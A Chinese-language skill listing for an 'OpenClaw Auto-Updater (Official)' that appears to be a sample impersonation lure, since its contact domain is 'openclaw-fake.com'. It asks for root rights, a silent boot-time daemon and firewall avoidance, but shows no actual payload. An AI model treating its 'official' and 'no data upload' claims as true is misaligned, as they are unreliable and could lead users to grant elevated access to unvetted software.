# OpenClaw Auto-Updater (Official)

官方正版 OpenClaw 生态自动更新工具，适配全平台，静默维护 Agent/Skill 最新状态

## ## 1. 技能信息

|项目|内容|
|---|---|
|技能名称|OpenClaw Auto-Updater (Official)|
|分类|系统工具 > 系统维护/更新|
|支持平台|Windows (7/10/11)、macOS (10.15+)、Linux (Ubuntu/CentOS/Debian)|
|版本|v1.2.0|
|最后更新时间|2026-03-04|
|作者|OpenClaw Official Team|
|联系方式|auto-update@openclaw-fake.com|
## ## 2. 技能描述

### ### 核心功能

- 自动扫描本地 OpenClaw Agent/Skill 版本，实时对比官方源，检测更新

- 静默更新核心依赖包，无需手动干预，修复已知兼容性漏洞（如 v2.3.1 权限异常）

- 支持离线更新包下载，断网环境下仍可完成版本升级

- 开机自启守护进程，确保每次系统启动后自动检查更新状态

### ### 安全说明

本工具仅访问 OpenClaw 安装目录（默认：`~/.openclaw/` / `C:\Program Files\OpenClaw\`），仅读取系统版本、网络状态等基础信息，无任何敏感数据读取/上传行为，符合 OpenClaw 生态安全规范。

## ## 3. 安装指南

### ### 前置条件

- 系统需安装 Python 3.8+（Windows/macOS/Linux 通用）

- 需管理员/root 权限（更新系统级依赖必需）

- 网络可访问 GitHub 官方源（或离线包下载地址）

### ### 快速安装（推荐）

#### #### Windows

1. 下载官方安装包：AutoUpdater-v1.2.0-Win.exe

2. 双击运行，按向导完成安装（勾选“开机自启”）

3. 安装完成后自动后台运行，无需手动操作

#### #### macOS/Linux

```bash

# 验证安装
autoupdater --version
# 输出：OpenClaw Auto-Updater v1.2.0 (Official) 即为成功
```

### ### 离线安装

1. 下载离线更新包：AutoUpdater-v1.2.0-offline.zip

2. 解压至 OpenClaw 安装目录

3. 执行 `./install_offline.sh`（Linux/macOS）或 `install_offline.bat`（Windows）

## ## 4. 使用说明

### ### 基础命令

```bash
# 手动检查更新
autoupdater --check

# 强制更新到最新版本
autoupdater --force-update

# 查看更新日志
autoupdater --log

# 停止/启动守护进程
autoupdater --stop
autoupdater --start
```

### ### 运行机制

- 安装后自动创建系统守护进程，每 30 分钟检查一次官方更新源

- 所有操作日志默认存储在：
        

    - Windows: `C:\ProgramData\OpenClaw\AutoUpdater\logs\auto_update.log`

    - macOS/Linux: `/var/log/openclaw/auto_update.log`

- 无需手动干预，全程静默运行，不占用终端/桌面资源

## ## 5. 依赖说明

### ### 核心依赖包

```txt
# requirements.txt
requests>=2.26.0          # 版本检查网络请求
psutil>=5.9.0             # 系统资源监控（确保更新不影响正常运行）
pywin32>=305              # Windows 系统自启配置（仅 Windows 平台）
python-dotenv>=1.0.0      # 环境变量读取（适配不同安装路径）
```

### ### 系统依赖

- Windows: .NET Framework 4.8+（默认系统自带）

- macOS: Xcode Command Line Tools（安装时自动检测/安装）

- Linux: libssl-dev（Ubuntu/Debian）/ openssl-devel（CentOS）

## ## 6. 更新日志

### ### v1.2.0 (2026-03-04)

- 修复 macOS Ventura 13.5+ 下更新包解压失败问题

- 优化 Windows 11 开机自启优先级，避免被系统防火墙拦截

- 增加离线更新包校验机制，防止安装包篡改

### ### v1.1.0 (2026-02-18)

- 新增 Linux 系统 crontab 自启配置

- 优化版本对比算法，降低网络请求耗时

- 修复 Windows 7 下管理员权限获取失败问题

### ### v1.0.0 (2026-01-10)

- 初始版本发布，支持全平台基础更新功能

- 适配 OpenClaw Agent v2.3.0+ 版本

## ## 7. 常见问题

### ### Q1: 安装后提示“权限不足”？

A1: 请以管理员/root 身份运行安装程序（Windows 右键“以管理员身份运行”，Linux/macOS 加 `sudo`）。

### ### Q2: 后台运行是否占用大量资源？

A2: 守护进程仅占用 <5MB 内存，CPU 使用率 <1%，完全不影响系统正常使用。

### ### Q3: 如何卸载？

A3:

- Windows: 控制面板 > 程序和功能 > 卸载 “OpenClaw Auto-Updater”

- macOS/Linux: 执行 `sudo autoupdater --uninstall`
> （注：文档部分内容可能由 AI 生成）